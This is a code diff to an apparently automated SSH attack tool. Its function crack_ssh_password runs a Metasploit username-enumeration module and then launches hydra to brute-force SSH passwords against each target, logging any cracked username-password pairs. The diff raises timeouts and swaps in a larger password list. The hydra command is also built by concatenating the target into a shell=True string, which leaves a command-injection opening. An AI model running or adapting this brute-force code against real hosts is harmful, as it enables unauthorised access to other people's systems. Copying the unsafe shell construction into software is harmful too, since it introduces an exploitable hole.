@@ -177,7 +177,7 @@ def crack_ssh_password(targets, attack_type, daemon_obj):
 
         # we run the exploit to get the username of targeted machine
         print('running selected metasploit module...', flush=True)
-        output = client.consoles.console().run_module_with_output(auxiliary, timeout=1000)
+        output = client.consoles.console().run_module_with_output(auxiliary, timeout=1200)
         # show the results and then process the data
         print(output, flush=True)
         with open('./out.log', 'a') as log:
@@ -186,11 +186,11 @@ def crack_ssh_password(targets, attack_type, daemon_obj):
 
         # we then proceed in trying to crack the password using hydra
         print(f'running hydra to crack password in {target}...', flush=True)
-        subprocess = sp.Popen('hydra -L valid_users.txt -P less_passwords.txt ssh://' + target, stdout=sp.PIPE,
+        subprocess = sp.Popen('hydra -L valid_users.txt -P passwords.txt ssh://' + target, stdout=sp.PIPE,
                               stderr=sp.PIPE,
                               shell=True, text=True)
         # we print the results and process the data
-        outs, errs = subprocess.communicate(timeout=10000)
+        outs, errs = subprocess.communicate(timeout=2400)
         with open('./out.log', 'a') as log:
             if outs:
                 # we process that data, so we can show the user-password pairs we found
